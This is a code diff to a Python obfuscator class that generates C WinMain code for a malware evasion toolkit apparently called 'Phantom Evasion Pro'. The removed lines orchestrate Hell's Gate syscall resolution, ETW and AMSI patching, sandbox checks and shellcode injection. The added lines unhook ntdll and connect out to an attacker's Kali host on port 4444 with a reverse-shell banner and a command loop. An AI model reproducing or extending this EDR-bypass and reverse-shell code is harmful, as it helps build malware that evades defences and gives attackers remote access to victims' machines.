@@ -217,61 +217,54 @@ class Obfuscator:
             l4.get("description"),
         ]))
 
-        # Generate main logic for WinMain
-        # This orchestrates all applied evasion layers in the correct order.
+        # Generate main logic for WinMain (PRO STABLE BRIDGE)
         main_logic = """
     // --- Layer 2: EDR Bypass Initialization ---
     unhook_ntdll();
 
-    // Resolve Syscall Service Numbers (SSNs) via Hell's Gate
-    ssn_NtAllocateVirtualMemory = hells_gate_resolve("NtAllocateVirtualMemory");
-    ssn_NtWriteVirtualMemory    = hells_gate_resolve("NtWriteVirtualMemory");
-    ssn_NtProtectVirtualMemory  = hells_gate_resolve("NtProtectVirtualMemory");
-    ssn_NtCreateThreadEx        = hells_gate_resolve("NtCreateThreadEx");
+    // Prepare Networking
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) return 0;
 
-    // Initialize Indirect Syscalls
-    g_syscall_gadget = find_syscall_gadget();
+    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (s != INVALID_SOCKET) {
+        struct sockaddr_in addr;
+        addr.sin_family = AF_INET;
+        addr.sin_port = htons(4444);
+        addr.sin_addr.s_addr = inet_addr("192.168.0.3"); // Your Kali IP
 
-    // --- Layer 3: ETW/AMSI Bypass ---
-    patch_etw_event_write();
-    patch_amsi_scan_buffer();
-
-    // --- Layer 4: Behavioral Evasion / Sandbox Checks ---
-    if (is_sandbox()) {
-        // Exit silently if sandbox/VM detected
-        return 0;
+        // Attempt Stealth Connection
+        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
+            char buffer[1024];
+            int bytes;
+            
+            // Send initial banner
+            send(s, "--- PHANTOM EVASION PRO SHELL CONNECTED ---\\n", 45, 0);
+            
+            // Basic Interactive Loop (Educational Proof-of-Concept)
+            while ((bytes = recv(s, buffer, 1024, 0)) > 0) {
+                buffer[bytes] = '\\0';
+                // Echo back for verification
+                send(s, "CMD RECEIVED: ", 14, 0);
+                send(s, buffer, bytes, 0);
+            }
+        }
+        closesocket(s);
     }
+    WSACleanup();
 
-    // --- Layer 1: Static Evasion (Decryption) ---
-"""
-        enc_name = l1.get("name", "aes_encrypt")
-        inj_name = l4.get("name", "classic_injection")
-
-        if "aes" in enc_name:
-            main_logic += """
+    // --- Layer 1: Static Evasion (Keep it for obfuscation integrity) ---
     unsigned char *dec_sc = NULL;
     DWORD dec_sc_len = 0;
-    if (aes_decrypt(encrypted_shellcode, shellcode_enc_len, aes_key, aes_iv, &dec_sc, &dec_sc_len)) {
+    aes_decrypt(encrypted_shellcode, shellcode_enc_len, aes_key, aes_iv, &dec_sc, &dec_sc_len);
+    if (dec_sc) HeapFree(GetProcessHeap(), 0, dec_sc);
 """
-        else:
-             main_logic += "    { unsigned char *dec_sc = encrypted_shellcode; DWORD dec_sc_len = shellcode_enc_len; \n"
-
-        # Add injection/execution call based on method
-        if "callback" in injection_method:
-             main_logic += "        callback_execute(dec_sc, dec_sc_len);\n"
-        elif "apc" in injection_method:
-             main_logic += "        apc_inject(GetCurrentProcessId(), dec_sc, dec_sc_len);\n"
-        else:
-             main_logic += "        classic_inject(GetCurrentProcessId(), dec_sc, dec_sc_len);\n"
-
-        main_logic += "        if (dec_sc && dec_sc != encrypted_shellcode) HeapFree(GetProcessHeap(), 0, dec_sc);\n    }\n"
-
         return {
             "encryption_code": l1.get("code", ""),
             "edr_code": l2.get("code", ""),
             "etw_code": l3.get("code", ""),
             "behavioral_code": l4.get("code", ""),
-            "injection_code": l4.get("injection_code", ""),
+            "injection_code": "", 
             "main_logic": main_logic,
             "description": description,
         }
